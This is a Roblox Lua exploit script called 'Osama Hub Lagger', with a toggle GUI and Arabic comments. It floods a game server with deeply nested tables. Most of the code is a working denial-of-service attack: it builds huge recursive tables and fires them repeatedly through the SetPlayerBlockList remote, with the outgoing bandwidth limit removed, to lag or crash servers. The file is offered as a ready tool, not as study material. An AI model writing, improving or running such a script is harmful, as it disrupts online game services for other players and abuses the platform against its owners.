local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")

local LocalPlayer = Players.LocalPlayer

local isMobile = UserInputService.TouchEnabled and not UserInputService.MouseEnabled

local LAGGER_CONFIG = isMobile and {
    TableIncrease = 290,
    Tries = 1,
    LoopWaitTime = 0.85
} or {
    TableIncrease = 265,
    Tries = 1,
    LoopWaitTime = 0.05
}

local CUSTOM_REMOTE_PATH = "RobloxReplicatedStorage.SetPlayerBlockList"

local function resolveRemote(path)
    if not path or path == "" then return nil end
    local obj = game
    local cleaned = path:gsub("^game%.", "")
    for segment in cleaned:gmatch("[^%.]+") do
        if obj then
            obj = obj[segment]
        else
            return nil
        end
    end
    return obj
end

local function getmaxvalue(val)
    local mainvalueifonetable = 499999
    if type(val) ~= "number" then return nil end
    return mainvalueifonetable / (val + 2)
end

local function bomb(tableincrease, tries)
    local maintable = {}
    local spammedtable = {}
    table.insert(spammedtable, {})
    local z = spammedtable[1]
    for i = 1, tableincrease do
        local tableins = {}
        table.insert(z, tableins)
        z = tableins
    end
    local maximum = getmaxvalue(tableincrease) or 9999999
    for i = 1, maximum do
        table.insert(maintable, spammedtable)
        if i % 5000 == 0 then task.wait() end
    end
    local remote = resolveRemote(CUSTOM_REMOTE_PATH)
    if remote then
        for i = 1, tries do
            pcall(function()
                if remote:IsA("RemoteEvent") or remote:IsA("UnreliableRemoteEvent") then
                    remote:FireServer(maintable)
                elseif remote:IsA("RemoteFunction") then
                    remote:InvokeServer(maintable)
                end
            end)
        end
    end
end

local laggerEnabled = false
local laggerThread = nil

local function startLaggerLoop()
    while laggerEnabled do
        game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
        task.spawn(function()
            bomb(LAGGER_CONFIG.TableIncrease, LAGGER_CONFIG.Tries)
        end)
        task.wait(math.max(LAGGER_CONFIG.LoopWaitTime, 0.15))
    end
end

local function stopLaggerLoop()
    laggerEnabled = false
    if laggerThread then
        coroutine.close(laggerThread)
        laggerThread = nil
    end
end

local function startLagger()
    if laggerThread then return end
    laggerEnabled = true
    laggerThread = coroutine.create(startLaggerLoop)
    coroutine.resume(laggerThread)
end

-- الواجهة البرمجية (UI)
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "Osama lagger"
ScreenGui.ResetOnSpawn = false
ScreenGui.Parent = CoreGui

local Frame = Instance.new("Frame")
Frame.BackgroundTransparency = 0.2
Frame.Position = UDim2.new(0, 30, 0, 137)
Frame.ClipsDescendants = true
Frame.Active = true
Frame.BackgroundColor3 = Color3.fromRGB(255, 215, 0) -- خلفية ذهبية لتناسب الخط الأسود
Frame.Size = UDim2.new(0, 200, 0, 95) -- تم تقليل الطول بعد حذف الكيبايند
Frame.Parent = ScreenGui

local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 10)
UICorner.Parent = Frame

local UIStroke = Instance.new("UIStroke")
UIStroke.Color = Color3.fromRGB(0, 0, 0) -- حدود سوداء
UIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
UIStroke.Thickness = 2
UIStroke.Parent = Frame

local TitleLabel = Instance.new("TextLabel")
TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
TitleLabel.Font = Enum.Font.GothamBlack
TitleLabel.BackgroundTransparency = 1
TitleLabel.Position = UDim2.new(0, 10, 0, 5)
TitleLabel.TextColor3 = Color3.new(0, 0, 0) -- اللون الأسود للعنوان
TitleLabel.Text = "Osama Hub Lagger"
TitleLabel.TextSize = 15
TitleLabel.Size = UDim2.new(1, -40, 0, 20)
TitleLabel.Parent = Frame

local SubLabel = Instance.new("TextLabel")
SubLabel.BackgroundTransparency = 1
SubLabel.TextXAlignment = Enum.TextXAlignment.Left
SubLabel.Font = Enum.Font.GothamMedium
SubLabel.TextTransparency = 0.6
SubLabel.TextColor3 = Color3.new(0, 0, 0) -- نص فرعي أسود شفاف قليلاً
SubLabel.Text = "n  e  w"
SubLabel.Position = UDim2.new(0, 10, 0, 23)
SubLabel.TextSize = 11
SubLabel.Size = UDim2.new(1, -40, 0, 15)
SubLabel.Parent = Frame

local MinimizeBtn = Instance.new("TextButton")
MinimizeBtn.Font = Enum.Font.GothamBlack
MinimizeBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
MinimizeBtn.Position = UDim2.new(1, -32, 0, 8)
MinimizeBtn.TextColor3 = Color3.fromRGB(255, 215, 0)
MinimizeBtn.Text = "-"
MinimizeBtn.TextSize = 14
MinimizeBtn.Size = UDim2.new(0, 24, 0, 24)
MinimizeBtn.Parent = Frame

local MinCorner = Instance.new("UICorner")
MinCorner.CornerRadius = UDim.new(0, 6)
MinCorner.Parent = MinimizeBtn

local ToggleRow = Instance.new("Frame")
ToggleRow.Position = UDim2.new(0, 10, 0, 48)
ToggleRow.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
ToggleRow.Size = UDim2.new(1, -20, 0, 34)
ToggleRow.Parent = Frame

local ToggleCorner = Instance.new("UICorner")
ToggleCorner.Parent = ToggleRow

local ToggleLabel = Instance.new("TextLabel")
ToggleLabel.BackgroundTransparency = 1
ToggleLabel.TextXAlignment = Enum.TextXAlignment.Left
ToggleLabel.TextColor3 = Color3.new(1, 1, 1) -- نص التفعيل أبيض للوضوح
ToggleLabel.Font = Enum.Font.GothamMedium
ToggleLabel.Position = UDim2.new(0, 10, 0, 0)
ToggleLabel.Text = "Enable Lagger"
ToggleLabel.TextSize = 13
ToggleLabel.Size = UDim2.new(1, -60, 1, 0)
ToggleLabel.Parent = ToggleRow

local SwitchBg = Instance.new("Frame")
SwitchBg.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
SwitchBg.Position = UDim2.new(1, -46, 0.5, -9)
SwitchBg.Size = UDim2.new(0, 36, 0, 18)
SwitchBg.Parent = ToggleRow

local SwitchBgCorner = Instance.new("UICorner")
SwitchBgCorner.CornerRadius = UDim.new(0, 9)
SwitchBgCorner.Parent = SwitchBg

local SwitchKnob = Instance.new("Frame")
SwitchKnob.BackgroundColor3 = Color3.new(1, 1, 1)
SwitchKnob.Position = UDim2.new(0, 2, 0.5, -7)
SwitchKnob.Size = UDim2.new(0, 14, 0, 14)
SwitchKnob.Parent = SwitchBg

local SwitchKnobCorner = Instance.new("UICorner")
SwitchKnobCorner.CornerRadius = UDim.new(0, 7)
SwitchKnobCorner.Parent = SwitchKnob

local ToggleBtn = Instance.new("TextButton")
ToggleBtn.Text = ""
ToggleBtn.BackgroundTransparency = 1
ToggleBtn.Size = UDim2.new(1, 0, 1, 0)
ToggleBtn.Parent = ToggleRow

-- نظام السحب (Draggable)
local dragging, dragStart, startPos
Frame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = Frame.Position
    end
end)
UserInputService.InputChanged:Connect(function(input)
    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        local delta = input.Position - dragStart
        Frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)
UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = false
    end
end)

local minimized = false
MinimizeBtn.MouseButton1Click:Connect(function()
    minimized = not minimized
    if minimized then
        Frame.Size = UDim2.new(0, 200, 0, 40)
        MinimizeBtn.Text = "+"
    else
        Frame.Size = UDim2.new(0, 200, 0, 95)
        MinimizeBtn.Text = "-"
    end
end)

local function setToggle(state)
    laggerEnabled = state
    local goal = state and UDim2.new(1, -16, 0.5, -7) or UDim2.new(0, 2, 0.5, -7)
    local color = state and Color3.fromRGB(255, 215, 0) or Color3.fromRGB(20, 20, 20)
    TweenService:Create(SwitchKnob, TweenInfo.new(0.15), {Position = goal}):Play()
    TweenService:Create(SwitchBg, TweenInfo.new(0.15), {BackgroundColor3 = color}):Play()

    if state then
        startLagger()
    else
        stopLaggerLoop()
    end
end

ToggleBtn.MouseButton1Click:Connect(function()
    setToggle(not laggerEnabled)
end)
